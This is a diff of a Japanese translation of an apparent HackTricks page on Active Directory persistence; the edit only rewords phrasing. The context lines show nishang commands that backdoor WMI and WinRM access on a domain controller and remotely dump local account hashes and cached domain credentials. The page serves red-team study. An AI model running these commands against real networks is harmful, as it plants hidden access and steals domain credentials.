@@ -12,14 +12,14 @@
 
 ### WMI へのアクセス
 
-ユーザーに**リモートで WMI を実行する**アクセスを与えることができます [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
+ユーザーに**リモート WMI を実行する**アクセスを与えることができます [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
 ```bash
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
 ```
 ### WinRMへのアクセス
 
-**ユーザーにwinrm PSコンソールへのアクセスを与える** [**これを使用して**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
+**ユーザーにwinrm PSコンソールへのアクセスを提供する** [**これを使用して**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
@@ -40,6 +40,6 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-[**シルバー チケット**](silver-ticket.md)を確認して、ドメイン コントローラーのコンピューター アカウントのハッシュをどのように使用できるかを学んでください。
+[**シルバー チケット**](silver-ticket.md)を確認して、ドメイン コントローラーのコンピュータ アカウントのハッシュをどのように使用できるかを学んでください。
 
 {{#include ../../banners/hacktricks-training.md}}
